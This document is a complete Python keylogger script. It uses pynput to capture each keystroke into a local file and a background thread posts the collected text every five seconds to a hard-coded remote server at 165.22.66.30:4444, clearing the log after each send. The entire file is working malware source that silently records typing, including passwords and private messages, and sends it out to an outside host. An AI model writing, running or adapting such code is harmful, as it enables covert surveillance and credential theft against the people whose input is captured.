from pynput.keyboard import Listener, Key
import requests as req
import threading
import time

HOST = "165.22.66.30"
PORT = "4444"

def send_to_server(log):
    try:
        r = req.post(f"http://{HOST}:{PORT}/api/getData", json={"logs": log})
        print("sent:", r.status_code, r.text)
    except Exception as e:
        print("error:", e)

def report():
    while True:
        try:
            with open("log.txt", "r") as f:
                content = f.read()
            if content.strip():
                print("sending:", repr(content))
                send_to_server(content)
                open("log.txt", "w").close()
        except FileNotFoundError:
            pass
        except Exception as e:
            print("error:", e)
        time.sleep(5)

def onPress(key):
    try:
        with open("log.txt", "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            elif hasattr(key, 'char') and key.char is not None:
                f.write(key.char)

    except Exception as e:
        print("error:", e)

if __name__ == "__main__":
    t = threading.Thread(target=report, daemon=True)
    t.start()
    with Listener(on_press=onPress) as listener:
        listener.join()